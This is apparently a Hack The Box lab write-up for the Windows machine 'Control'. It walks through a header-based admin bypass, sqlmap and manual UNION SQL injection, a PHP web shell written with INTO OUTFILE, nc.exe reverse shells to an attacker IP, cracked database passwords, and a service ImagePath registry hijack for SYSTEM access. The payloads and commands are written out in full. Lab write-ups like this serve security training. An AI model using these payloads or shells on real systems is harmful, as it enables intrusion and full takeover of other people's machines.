---
title: "[HARD] HTB-Control"
draft: false
tags:
  - htb
  - windows
---
## Information Gathering
### Rustscan

Rustscan finds HTTP, MSRPC, and MySQL running on the server.

```bash
┌──(yoon㉿kali)-[~/Documents/htb/control]
└─$ rustscan --addresses 10.10.10.167 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍
<snip>
Host is up, received syn-ack (0.31s latency).
Scanned at 2024-04-17 09:26:59 EDT for 2s

PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack
135/tcp   open  msrpc   syn-ack
3306/tcp  open  mysql   syn-ack
49666/tcp open  unknown syn-ack
49667/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.54 seconds
```

### Nmap

There's nothing special from the nmap scan:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/control]
└─$ sudo nmap -sVC -p 80,135,3306,49666,49667 10.10.10.167                                         
[sudo] password for yoon: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 09:29 EDT
Nmap scan report for 10.10.10.167
Host is up (0.30s latency).

PORT      STATE    SERVICE VERSION
80/tcp    open     http    Microsoft IIS httpd 10.0
|_http-title: Fidelity
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open     msrpc   Microsoft Windows RPC
3306/tcp  filtered mysql
49666/tcp open     msrpc   Microsoft Windows RPC
49667/tcp open     msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.92 seconds
```


## Enumeration
### MySQL - TCP 3306

MySQL won't allow login from my VPN IP address:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-3.png)


### HTTP - TCP 80

The website seems to be for some sort of tech company and has menus on top right corner:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-1.png)

Source code has an interesting hidden information on it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-5.png)



`/admin.php` shows **Access Denied**, saying Header is missing and I have to go through the proxy to access the page:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-3.png)

#### Directory Bruteforce
Before trying to bypass **admin.php** restriction, I will first directory bruteforce using Feroxbuster:

`sudo feroxbuster -u http://10.10.10.167 -n -x php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-4.png)

Feroxbuster discovers several interesting paths such as **uploads**.

I will do directory bruteforce once more on it:

`sudo feroxbuster -u http://10.10.10.167/uploads -n -x php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-9.png)






## HTTP Header Bruteforce

[Here](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/BurpSuite-ParamMiner/uppercase-headers), I found bunch of HTTP Headers that I can bruteforce with. 


I will first bruteforce headers with host IP address:

`wfuzz -c -w headers.txt -u http://10.10.10.167/admin.php -H "FUZZ: 10.10.10.167"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-6.png)

It seems like **Access Denied** page had the size of 89.

This time, I will filter out headers with size of 89:

`wfuzz -c -w headers.txt -u http://10.10.10.167/admin.php -H "FUZZ: 10.10.10.167" --hh 89`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-7.png)

Several headers are found but none of them has the response code of 200.

Remembering the IP address from source code earlier, I will change the host IP address to IP address found from the source code:

`wfuzz -c -w headers.txt -u http://10.10.10.167/admin.php -H "FUZZ: 192.168.4.28" --hh 89`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-8.png)

It seems like **X-FORWARDED-FOR: 192.168.4.28** will help to bypass the access denied page. 

## /admin.php

Now by intercepting the request to admin.php and adding **X-FORWARDED-FOR: 192.168.4.28**, I should be able to access admin.php:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-10.png)

admin.php seems to be a page where it helps to manage products such as to search, delete, and update:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-11.png)

Since modifying the header value everytime I move pages is annoying, I will use Firefox's [Modify-Header-Value](https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search) to automate this:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-12.png)

I can set up the Header for `http://10.10.10.167` as such, and now it automatically add the header everytime I move between pages:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-13.png)

## SQLi to Shell
### SQLMap

I will try adding **'** at the end of the product name to see if anything happens:

`http://10.10.10.167/search_products.php`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-14.png)

It seems like there is SQL running here with MariaDB at the background. 

I will intercept the request to `search_products.php` so that I can pass it on to **sqlmap**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-15.png)

I will run sqlmap towards the request and it seems to be vulnerable to SQL injection: 

`sqlmap -r search-product-req.txt --dbs --batch`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-16.png)

There are three databases running in the background: **information_schema**, **mysql**, and **warehouse**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-17.png)

I will now query tables inside **warehouse** database:

`sqlmap -r search-product-req.txt --dbs --batch -p productName -D warehouse --tables`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-18.png)

There are three tables (product, product_category, and product_pack), and none of them looks very intriguing. 

Now I will list tables in **mysql** database:

`sqlmap -r search-product-req.txt --dbs --batch -p productName -D mysql --tables`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-20.png)

**user** table looks interesting to me. 

I will move on to dump **user** table from **mysql** database:

`sqlmap -r search-product-req.txt --dbs --batch -p productName -D mysql -T user --dump`

| Host        | User    | Password                                          |
|-------------|---------|---------------------------------------------------|
| localhost   | root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8       |
| fidelity    | root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8       |
| 127.0.0.1   | root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8       |
| ::1         | root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8       |
| localhost   | manager | *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA (l3tm3!n) |
| localhost   | hector  | *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D       |

It discovers bunch of password hashes and password for user **manager** is cracked: **l3tm3!n**

I will try spawning **os-shell** just in case it works:

`sqlmap -r search-product-req.txt --dbs --batch -p productName --os-shell`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-19.png)

Luckily, I can spawn a shell as the **nt authority\iusr** but it seems like I amd not able to spawn a reverse shell connection from this sqlmap shell connection to my local listener. 

I would have to spawn a reverse shell through manual sql injection not using SQLmap. 


### Manual SQli

Although using tools such as sqlmap is convenient, it is best practice to understand what is going on when you run a tool. I can manually conduct SQLi without SQLmap as well. 


#### Identify Number of Columns

We first have to identify number of columns.

When selecting 5 columns, it shows an error:

`productName=Asus+USB-AC53+Nano' UNION SELECT 1,2,3,4,5;-- -`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-22.png)

Selecting 6 columns works fine without any error, meaning there are 6 columns present at the database:

`productName=Asus+USB-AC53+Nano' UNION SELECT 1,2,3,4,5,6;-- -`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-21.png)

#### Current user and database

Using the command below, I can query current database and user which is **warehouse** and **manager@localhost**:

`productName=Asus USB-AC53+Nano' UNION SELECT database(),user(),3,4,5,6;-- -`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-23.png)

#### List Database

I can list database using the command below: **information_schema**, **mysql**, **warehouse**

`productName=Asus USB-AC53 Nano' UNION SELECT group_concat(schema_name),2,3,4,5,6 from information_schema.schemata;-- -`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-24.png)

#### List Tables

I can list tables inside the database as such:

`productName=Asus USB-AC53 Nano' UNION SELECT group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema='warehouse';-- -`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-25.png)

#### List columns

I can list coulmns inside table as such:

`productName=Asus USB-AC53 Nano' UNION SELECT group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name='user';-- -`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-27.png)

#### User, Password

I can read specific column fom the table as such:

`productName=Asus USB-AC53 Nano' UNION SELECT user,password,3,4,5,6 from mysql.user;-- -`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-28.png)





### SQLi Shell

Using [this article](https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/), I will be able to spawn a shell using SQL injection. 

I will first upload PHP cmd shell to `C:/inetpub/wwwroot/` as **cmd.php**:

`productName=Asus USB-AC53 Nano' UNION SELECT '<?php system($_GET["cmd"]); ?>',2,3,4,5,6 into outfile 'c:/inetpub/wwwroot/cmd.php';-- -`


I can confirm RCE working using curl as such:

`curl -s 'http://10.10.10.167/cmd.php?cmd=whoami'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-30.png)

Now in order to spawn reverse shell, I will first transfer **nc.exe** over using smbserver.

Prepare smbserver on directory with **nc.exex**:

`impacket-smbserver share $(pwd) -smb2support`

I will save **nc.exe** to `C:\Windows\Temp` using the command below:

`curl -s 'http://10.10.10.167/cmd.php?cmd=copy+\\10.10.14.21\share\nc.exe+C%3a\Windows\Temp\nc.exe'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-32.png)

I can confirm **nc.exe** is transferred successfully:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-33.png)

Running **nc.exe** towards my local Kali lister, now I have shell as **nt authority\iusr**:

`curl 'http://10.10.10.167/cmd.php?cmd=C%3a\Windows\Temp\nc.exe+-e+cmd.exe+10.10.14.21+1337'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-34.png)

## Privesc: iusr to Hector
### PowerUp.ps1


I will first start powershell session through `powershell` command and download **PowerUp.ps1**:

`copy \\10.10.14.21\share\PowerUp.ps1 C:\Windows\Temp\PowerUp.ps1`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-35.png)

After running PowerUp.ps1, I can see the results using `Invoke-AllChecks`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-36.png)

PowerUp.ps1 find one thing interesting which is **SeImpersonatePrivilege**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-37.png)

Before running JuicyPotato attack, I will first check systeminfo to make sure the version is vulnerable to JP attack. 

Current user has no privilege to run `systeminfo`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-39.png)

Running nmap os scan, it guesses system is running on Microsofot Windows 2019 most likely:

`sudo nmap -O 10.10.10.167 -v`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-38.png)

Since Windows server 2019 is not vulnerable to JP attack, I will move on. 

### Local Enumerartion

On `C:\Users`, there's only one user other than Administrator: **Hector**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-40.png)

It seems like Hector is in **Remote Management Users** group:

`net user hector`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-41.png)

I can see that the host is listening on 5985 (WinRM), even though the firewall must be preventing me from seeing it from my box:

`netstat -ano -p tcp`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-42.png)

I will be able to execute commands as hector using powershell but I will need hector's password.

### Password Crack

Using crackstation I can crack password hash for hector: **l33th4x0rhector**

picture here

### Run command as Hector

After starting Powershell using `powershell`, I will create credential object:


```powershell
$SecPassword = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('object.local\hector', $SecPassword)
```

Now using powershell's cmdlet **Invoke-Command** and credential object, I can run commands as hector:

`Invoke-Command -Computer localhost -Credential $Cred -ScriptBlock {whoami}`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-43.png)

### Shel as hector

Now that I can run commands as hector, I will once again try to spawn a reverse shell. 

For some reason, hector cannot access the **nc.exe** file uploaded previously to `C:\Windows\Temp`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-44.png)

I will make one more copy of nc.exe to different directory:

`copy \\10.10.14.21\share\nc.exe C:\Windows\system32\spool\drivers\color\nc.exe`

Now I can successfully run the command:

`Invoke-Command -Computer localhost -Credential $Cred -ScriptBlock {C:\Windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.14.21 1338}`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-45.png)

I have a reverse shell connection as hector:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-46.png)

## Privesc: Hector to Administrator
### WinPEAS
**WinPEAS.exe** finds PS history file under `C:\Users\Hector\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-47.png)

Following two commands are shown in the Powershell history:

```powershell
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-48.png)

These PowerShell commands are used for interacting with the Windows Registry and retrieving information about registry keys and their access control lists (ACLs).

1. **`Get-ChildItem HKLM:\SYSTEM\CurrentControlSet | Format-List`**:
   - This command retrieves a list of child items (subkeys) under the `HKLM:\SYSTEM\CurrentControlSet` registry key.
   - `Get-ChildItem` is a cmdlet used to retrieve the child items (subkeys, properties, etc.) of a specified registry key.
   - `HKLM:` is the PowerShell provider alias for the HKEY_LOCAL_MACHINE registry hive.
   - `SYSTEM\CurrentControlSet` is the registry path from which child items are retrieved.
   - `Format-List` cmdlet is used to format the output as a list.

2. **`Get-Acl HKLM:\SYSTEM\CurrentControlSet | Format-List`**:
   - This command retrieves the access control list (ACL) of the `HKLM:\SYSTEM\CurrentControlSet` registry key.
   - `Get-Acl` is a cmdlet used to retrieve the ACL of a specified registry key or file system object.
   - `HKLM:\SYSTEM\CurrentControlSet` is the registry path for which the ACL is retrieved.
   - `Format-List` cmdlet is used to format the output as a list.

`get-childitem HKLM:\SYSTEM\CurrentControlset | format-list` will list out bunch of services:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-50.png)

`get-acl HKLM:\SYSTEM\CurrentControlSet | format-list` will show the **ACL**: 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-49.png)

```powershell
Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\Authenticated Users Allow  -2147483648
         S-1-5-32-549 Allow  ReadKey
         S-1-5-32-549 Allow  -2147483648
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         -2147483648
Audit  : 
Sddl   : O:BAG:SYD:AI(A;;KA;;;BA)(A;ID;KR;;;AU)(A;CIIOID;GR;;;AU)(A;ID;KR;;;SO)(A;CIIOID;GR;;;SO)(A;ID;KA;;;BA)(A;CIIOI
         D;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-
         3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;;S
         -1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
```
### Insecure ACLs abuse
#### Decrypt Sddl

I will first make Sddl readable using **ConvertFrom-SddlString** command as such:

```powershell
$acl = get-acl HKLM:\SYSTEM\CurrentControlSet\Services
ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl}
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-52.png)

Since the above is still not very pretty to read, I organized it below:

```bash
NT AUTHORITY\Authenticated Users: AccessAllowed (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)

NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)

BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)

CONTROL\Hector: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)

APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)
```

It seems like **Hector** got Full control over ACL. 

#### Exploitation

Hector has Read/Write access to a lot of registry entries related to services.

In order to get RCE as the system, I would need the following:

- I can edit registry entries as Hector
- I need to start and stop the service as Hector
- Serice is already configured to run as the LocalSystem

```powershell
$services = Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\*
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-53.png)

```powershell
$services | Where-Object { ($_.ObjectName -match 'LocalSystem') }
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-54.png)


```powershell
$services | Where-Object { ($_.ObjectName -match 'LocalSystem') -and ($_.Start -eq '3') }
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-55.png)

```powershell
$fs = $services | Where-Object { ($_.ObjectName -match 'LocalSystem') -and ($_.Start -eq '3') }
```

```powershell
$names = $fs.pschildname
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-56.png)


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-61.png)

reg query HKLM\System\CurrentControlSet\Services\seclogon

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-62.png)

```powershell
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "c:\windows\system32\spool\drivers\color\nc.exe 10.10.14.21 9002 -e cmd.exe" /f
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-63.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-64.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-65.png)




## References
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/BurpSuite-ParamMiner/uppercase-headers
- https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/
- https://www.stationx.net/powershell-cheat-sheet/
- https://mostwanted002.gitlab.io/post/htb-control-writeup/